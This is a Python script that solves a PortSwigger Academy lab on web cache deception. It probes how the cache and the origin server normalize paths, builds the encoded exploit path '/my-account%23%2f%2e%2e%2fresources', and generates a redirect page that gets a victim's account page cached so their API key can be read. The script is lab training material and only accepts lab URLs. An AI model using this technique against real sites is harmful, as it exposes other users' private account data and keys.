#!/usr/bin/env python3
"""
Lab 4: Web cache deception - Exploiting cache server normalization
Link:
https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-cache-server-normalization

Description:
    This lab demonstrates a normalization discrepancy between the cache and
    origin server. The cache resolves encoded dot-segments, while the origin
    server does not. An origin-side delimiter (%23) is used to make the origin
    return /my-account while the cache normalizes the path to /resources.

Usage:
    python3 lab-4-wcd-cache-normalization.py https://YOUR-LAB-ID.web-security-academy.net
    python3 lab-4-wcd-cache-normalization.py https://YOUR-LAB-ID.web-security-academy.net -p 127.0.0.1:8080

Proxy:
    -p / --proxy accepts HOST:PORT, following the style of your Lab 11 script.
    HTTPS certificate verification is disabled for local intercepting proxies.
    Use only against your authorized PortSwigger lab.
"""

import sys
import re
import argparse
import time
from html.parser import HTMLParser
from urllib.parse import urlsplit, urljoin

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── ANSI colors ──────────────────────────────────────────────────────────────
GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

TIMEOUT = 10
USERNAME = "wiener"
PASSWORD = "peter"

# The lab's documented successful delimiter is encoded # (%23).
EXPLOIT_PATH = "/my-account%23%2f%2e%2e%2fresources?wcd"


class CSRFParser(HTMLParser):
    """Extract the login form's CSRF token."""
    def __init__(self):
        super().__init__()
        self.csrf = None

    def handle_starttag(self, tag, attrs):
        if tag.lower() == "input":
            attrs = dict(attrs)
            if attrs.get("name") == "csrf":
                self.csrf = attrs.get("value")


class ResourceParser(HTMLParser):
    """Collect same-site resource paths from HTML."""
    def __init__(self):
        super().__init__()
        self.paths = []

    def handle_starttag(self, tag, attrs):
        attrs = dict(attrs)
        for name in ("src", "href"):
            value = attrs.get(name)
            if value and value.startswith("/resources/"):
                self.paths.append(value)


def print_banner():
    banner = f"""
{CYAN}{BOLD}╔══════════════════════════════════════════════════════════════════╗
║  Lab 4 – Web Cache Deception: Cache Server Normalization         ║
║  PortSwigger Web Security Academy                                ║
╚══════════════════════════════════════════════════════════════════╝{RESET}
"""
    print(banner)


def build_proxies(proxy):
    """Build requests proxy dictionary using HOST:PORT input."""
    if proxy:
        proxy_url = proxy if "://" in proxy else f"http://{proxy}"
        return {"http": proxy_url, "https": proxy_url}
    return {}


def request(session, method, url, **kwargs):
    """Send a request with consistent timeout and useful connection errors."""
    kwargs.setdefault("timeout", TIMEOUT)
    try:
        return session.request(method, url, **kwargs)
    except requests.exceptions.ProxyError:
        print(f"{RED}[✗] Proxy connection failed. Is your proxy listener running?{RESET}")
        sys.exit(1)
    except requests.exceptions.Timeout:
        print(f"{RED}[✗] Request timed out.{RESET}")
        sys.exit(1)
    except requests.exceptions.ConnectionError:
        print(f"{RED}[✗] Connection failed. Is the lab running?{RESET}")
        sys.exit(1)
    except requests.exceptions.RequestException as exc:
        print(f"{RED}[✗] Request failed: {exc}{RESET}")
        sys.exit(1)


def get_session(url, proxy=None):
    """Create a session and retrieve the login page's CSRF token."""
    session = requests.Session()
    session.proxies.update(build_proxies(proxy))
    session.verify = False
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) WCD-Lab-Solver/1.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    })

    response = request(session, "GET", f"{url}/login")
    response.raise_for_status()

    parser = CSRFParser()
    parser.feed(response.text)

    if not parser.csrf:
        print(f"{RED}[✗] Could not find the login CSRF token.{RESET}")
        print(f"{YELLOW}[*] Check that the lab is active and the URL is correct.{RESET}")
        sys.exit(1)

    return session, parser.csrf


def login(session, url, csrf):
    """Log in as the standard lab user."""
    print(f"{YELLOW}[*] Logging in as {USERNAME}...{RESET}")

    response = request(
        session, "POST", f"{url}/login",
        data={"csrf": csrf, "username": USERNAME, "password": PASSWORD},
        allow_redirects=True,
    )

    if "/login" in urlsplit(response.url).path:
        print(f"{RED}[✗] Login failed. Check the credentials and lab status.{RESET}")
        sys.exit(1)

    print(f"{GREEN}[✓] Login request completed.{RESET}")


def show_response(label, response):
    """Print useful response details for troubleshooting."""
    print(f"\n{CYAN}[{label}]{RESET}")
    print(f"{YELLOW}URL          :{RESET} {response.url}")
    print(f"{YELLOW}Status       :{RESET} {response.status_code}")
    print(f"{YELLOW}X-Cache      :{RESET} {response.headers.get('X-Cache', 'Not present')}")
    print(f"{YELLOW}Cache-Control:{RESET} {response.headers.get('Cache-Control', 'Not present')}")
    print(f"{YELLOW}Content-Type :{RESET} {response.headers.get('Content-Type', 'Not present')}")
    print(f"{YELLOW}Location     :{RESET} {response.headers.get('Location', 'None')}")


def extract_api_key(html):
    """Try to extract an API key from an account page."""
    patterns = [
        r"Your\s+API\s+Key\s*</[^>]*>\s*<[^>]*>\s*([^<\s]+)",
        r"API\s*key\s*</[^>]*>\s*<[^>]*>\s*([^<\s]+)",
        r"API\s*key\s*:\s*([A-Za-z0-9._~-]{8,})",
        r"Your\s+API\s+key\s*(?:is)?\s*[:\-]?\s*([A-Za-z0-9._~-]{8,})",
    ]
    for pattern in patterns:
        match = re.search(pattern, html, re.IGNORECASE)
        if match:
            return match.group(1)
    return None


def test_account(session, url):
    """Verify that the authenticated account page is accessible."""
    print(f"\n{YELLOW}[*] Checking baseline /my-account...{RESET}")
    response = request(session, "GET", f"{url}/my-account", allow_redirects=False)
    show_response("Baseline account endpoint", response)

    if response.status_code != 200:
        print(f"{RED}[✗] Account page did not return HTTP 200.{RESET}")
        sys.exit(1)

    api_key = extract_api_key(response.text)
    print(f"{GREEN}[✓] Authenticated account page is accessible.{RESET}")
    if api_key:
        print(f"{CYAN}[*] Your API key: {api_key}{RESET}")
    else:
        print(f"{YELLOW}[!] API key pattern was not found; inspect the response body.{RESET}")
    return response.text


def test_origin_delimiters(session, url):
    """
    Test the lab's documented origin delimiters.
    A 200 response containing the account API key suggests that the origin
    truncates the path at that delimiter.
    """
    print(f"\n{YELLOW}[*] Testing origin path delimiters...{RESET}")
    tests = [
        ("question mark", "/my-account?abc"),
        ("encoded hash (%23)", "/my-account%23abc"),
        ("encoded question mark (%3f)", "/my-account%3fabc"),
    ]

    for label, path in tests:
        response = request(session, "GET", url + path, allow_redirects=False)
        show_response(f"Origin delimiter test: {label}", response)
        if response.status_code == 200 and extract_api_key(response.text):
            print(f"{GREEN}[✓] {label} appears to act as an origin path delimiter.{RESET}")
        else:
            print(f"{YELLOW}[!] {label} did not return the expected account response.{RESET}")


def discover_resource(session, url):
    """Find a real /resources path in the homepage or login page."""
    candidates = []
    for page in (url + "/", url + "/login"):
        response = request(session, "GET", page, allow_redirects=True)
        parser = ResourceParser()
        parser.feed(response.text)
        candidates.extend(parser.paths)

    # Preserve order and remove duplicates.
    for path in dict.fromkeys(candidates):
        if path.startswith("/resources/"):
            return path

    # Fallback path is only used for cache-rule probing; it need not exist.
    print(f"{YELLOW}[!] Could not discover a static resource; using a probe path.{RESET}")
    return "/resources/does-not-exist.js"


def test_origin_normalization(session, url):
    """Check whether the origin resolves an encoded dot-segment."""
    path = "/aaa/..%2fmy-account"
    print(f"\n{YELLOW}[*] Testing origin normalization: {path}{RESET}")
    response = request(session, "GET", url + path, allow_redirects=False)
    show_response("Origin normalization test", response)

    if response.status_code == 404:
        print(f"{GREEN}[✓] Origin does not appear to normalize this encoded dot-segment.{RESET}")
    elif response.status_code == 200 and extract_api_key(response.text):
        print(f"{YELLOW}[!] Origin returned account data; it may normalize the encoded dot-segment.{RESET}")
    else:
        print(f"{YELLOW}[!] Unexpected response; inspect it in Burp Proxy history.{RESET}")


def test_cache_normalization(session, url):
    """
    Compare cache behavior before and after encoded dot-segments.
    The lab's cacheable static directory is /resources.
    """
    resource = discover_resource(session, url)
    resource_suffix = resource[len("/resources/"):]
    print(f"\n{CYAN}[*] Discovered resource: {resource}{RESET}")

    before_path = "/aaa/..%2fresources/" + resource_suffix
    after_path = "/resources/..%2f" + resource_suffix

    print(f"\n{YELLOW}[*] Testing cache normalization before /resources...{RESET}")
    for attempt in range(1, 3):
        response = request(
            session, "GET", url + before_path,
            allow_redirects=False,
        )
        show_response(f"Cache normalization (prefix traversal) request {attempt}", response)
        time.sleep(1)

    print(f"\n{YELLOW}[*] Testing encoded dot-segment after /resources...{RESET}")
    response = request(session, "GET", url + after_path, allow_redirects=False)
    show_response("Cache normalization (inside resources) test", response)


def test_exploit_candidates(session, url):
    """Test the candidate exploit paths and show cache miss/hit behavior."""
    print(f"\n{YELLOW}[*] Testing exploit delimiter candidates...{RESET}")
    candidates = [
        ("literal question mark", "/my-account?%2f%2e%2e%2fresources?wcd-q"),
        ("encoded hash (%23)", "/my-account%23%2f%2e%2e%2fresources?wcd-probe"),
        ("encoded question mark (%3f)", "/my-account%3f%2f%2e%2e%2fresources?wcd-f"),
    ]

    for label, path in candidates:
        print(f"\n{CYAN}[*] Candidate: {label}{RESET}")
        for attempt in range(1, 3):
            response = request(session, "GET", url + path, allow_redirects=False)
            show_response(f"{label} request {attempt}", response)
            if response.status_code == 200 and extract_api_key(response.text):
                print(f"{GREEN}[✓] Account response and API key detected.{RESET}")
            time.sleep(1)


def create_exploit(url):
    """Generate the HTML to paste into the PortSwigger Exploit Server Body."""
    victim_url = url + EXPLOIT_PATH
    html = f"""<!doctype html>
<html>
<head>
    <meta charset="utf-8">
    <title>Web Cache Deception Lab 4</title>
</head>
<body>
    <script>
        document.location = {victim_url!r};
    </script>
</body>
</html>
"""

    filename = "wcd_lab4_exploit.html"
    try:
        with open(filename, "w", encoding="utf-8") as file:
            file.write(html)
    except OSError as exc:
        print(f"{RED}[✗] Could not write exploit file: {exc}{RESET}")
        sys.exit(1)

    print(f"\n{GREEN}[✓] Exploit HTML saved to: {filename}{RESET}")
    print(f"{CYAN}[*] Victim URL: {victim_url}{RESET}")
    print(f"\n{YELLOW}[*] Exploit HTML (paste this into the Exploit Server Body):{RESET}\n{html}")
    print(f"{BOLD}NEXT STEPS:{RESET}")
    print("  1. Open the lab's 'Go to exploit server' link.")
    print("  2. Paste the generated HTML into the Exploit Server Body field.")
    print("  3. Click 'Store', then 'Deliver exploit to victim'.")
    print("  4. After delivery, open the Victim URL shown above.")
    print("  5. Copy Carlos's API key from the returned account page.")
    return victim_url


def submit_solution(session, url):
    """Ask for Carlos's API key and submit it to the lab."""
    print(f"\n{BOLD}{CYAN}MANUAL STEP:{RESET}")
    print("  1. Deliver the exploit to Carlos using the Exploit Server.")
    print("  2. Open the generated Victim URL in your browser.")
    print("  3. Copy Carlos's API key from the cached response.")

    while True:
        api_key = input(
            f"\n{YELLOW}[?] Paste Carlos's API key (or type 'q' to quit): {RESET}"
        ).strip()

        if api_key.lower() in {"q", "quit", "exit"}:
            print(f"{YELLOW}[*] Submission cancelled by user.{RESET}")
            return False

        api_key = api_key.strip("\"' \t\r\n")
        if not api_key:
            print(f"{RED}[✗] API key cannot be empty.{RESET}")
            continue
        if any(char.isspace() for char in api_key):
            print(f"{RED}[✗] API key contains whitespace. Copy only the key value.{RESET}")
            continue
        break

    print(f"\n{YELLOW}[*] Submitting Carlos's API key to {url}/submitSolution ...{RESET}")
    response = request(
        session, "POST", f"{url}/submitSolution",
        data={"answer": api_key},
        allow_redirects=True,
    )
    print(f"{YELLOW}[*] HTTP Status: {response.status_code}{RESET}")

    try:
        result = response.json()
    except ValueError:
        result = None

    if isinstance(result, dict) and result.get("correct") is True:
        print(f"\n{GREEN}{BOLD}[✓] Correct API key! Lab solved successfully.{RESET}")
        return True

    if isinstance(result, dict) and result.get("correct") is False:
        print(f"{RED}[✗] API key rejected. Make sure you copied Carlos's key correctly.{RESET}")
        return submit_solution(session, url)

    page_text = response.text.lower()
    if "is-solved" in page_text or "congratulations" in page_text:
        print(f"\n{GREEN}{BOLD}[✓] Submission appears successful. Check the lab status.{RESET}")
        return True

    print(f"{YELLOW}[!] The server did not clearly confirm success.{RESET}")
    if result is not None:
        print(f"{CYAN}[*] Response JSON: {result}{RESET}")
    else:
        print(f"{CYAN}[*] Response preview: {response.text[:500]}{RESET}")
    print(f"{YELLOW}[*] Check the lab status in your browser.{RESET}")
    return False


def exploit(url, proxy=None):
    print(f"{YELLOW}[*] Target : {url}{RESET}")
    print(f"{YELLOW}[*] Proxy  : {proxy if proxy else 'disabled'}{RESET}\n")

    # Step 1 – Start session and get CSRF token.
    session, csrf = get_session(url, proxy)

    # Step 2 – Authenticate as the lab user.
    login(session, url, csrf)

    # Step 3 – Verify the authenticated account endpoint.
    test_account(session, url)

    # Step 4 – Identify origin path delimiters.
    test_origin_delimiters(session, url)

    # Step 5 – Test origin-side path normalization.
    test_origin_normalization(session, url)

    # Step 6 – Test cache-side normalization and /resources cache rule.
    test_cache_normalization(session, url)

    # Step 7 – Test the exploit path candidates.
    test_exploit_candidates(session, url)

    # Step 8 – Generate the victim exploit HTML.
    create_exploit(url)

    # Step 9 – Manually retrieve Carlos's key and submit it.
    submit_solution(session, url)


def validate_url(value):
    parsed = urlsplit(value)
    if (
        parsed.scheme != "https"
        or not parsed.hostname
        or not parsed.hostname.endswith(".web-security-academy.net")
        or parsed.path not in ("", "/")
        or parsed.query
        or parsed.fragment
    ):
        raise argparse.ArgumentTypeError(
            "Provide only your full lab origin, e.g. "
            "https://0a...web-security-academy.net"
        )
    return value.rstrip("/")


def main():
    parser = argparse.ArgumentParser(
        description="PortSwigger Lab 4 – exploiting cache server normalization"
    )
    parser.add_argument("url", type=validate_url, help="Your PortSwigger lab URL")
    parser.add_argument(
        "-p", "--proxy", metavar="HOST:PORT",
        help="Optional proxy, e.g. 127.0.0.1:8080",
    )
    args = parser.parse_args()

    print_banner()
    exploit(args.url, proxy=args.proxy)


if __name__ == "__main__":
    main()
